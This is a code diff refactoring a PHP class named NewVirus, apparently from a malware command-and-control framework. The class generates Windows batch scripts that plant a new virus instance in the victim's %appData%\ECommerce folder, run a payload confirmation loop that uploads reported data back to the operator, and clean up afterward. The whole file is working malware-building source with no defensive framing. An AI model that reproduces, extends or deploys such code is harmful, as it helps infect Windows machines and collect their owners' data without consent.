@@ -1,17 +1,19 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class NewVirus extends AttackInterface {
+class NewVirus extends AttackBase {
     private string $baseLocation = "%appData%\\ECommerce";
     private string $newVirusId = "";
+    private string $user_handle = "";
 
-    /**
-     * This will generate the intercept code that will be used to take the reported data back from the virus.
-     */
+    public function __construct() {
+        parent::__construct();
+    }
+
     public function generateIntercept(): string {
         ob_start(); //@formatter:off ?>
         $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
@@ -36,30 +38,23 @@ class NewVirus extends AttackInterface {
         $this->newVirusId = $newVirusId;
     }
 
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
-        $this->baseLocation = $state["baseLocation"];
         $this->newVirusId = $state["newVirusId"];
+        $this->baseLocation = $state["baseLocation"];
+        $this->user_handle = $state["user_handle"];
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
         if ($this->newVirusId == "") { // if the new virus id has not been initialized with anything, create a new one
             $virus = $this->virusFactory->new($this->session->get("user_handle"));
             $this->newVirusId = $virus->getVirusId();
+            $this->user_handle = $this->session->getCheck("user_handle");
         }
         $state["newVirusId"] = $this->newVirusId;
         $state["baseLocation"] = $this->baseLocation;
+        $state["user_handle"] = $this->user_handle;
         return json_encode($state);
     }
 
@@ -69,22 +64,14 @@ class NewVirus extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
     public function generateBatchCode(): string {
         ob_start();
-        echo BaseScriptWin::initStandalone($this->newVirusId, $this->session->get("user_handle"), $this->baseLocation);
+        echo BaseScriptWin::initStandalone($this->newVirusId, $this->user_handle, $this->baseLocation);
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
         return ob_get_clean();
     }
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
+    public function processExtras(string $resourceIdentifier): void {
     }
 }
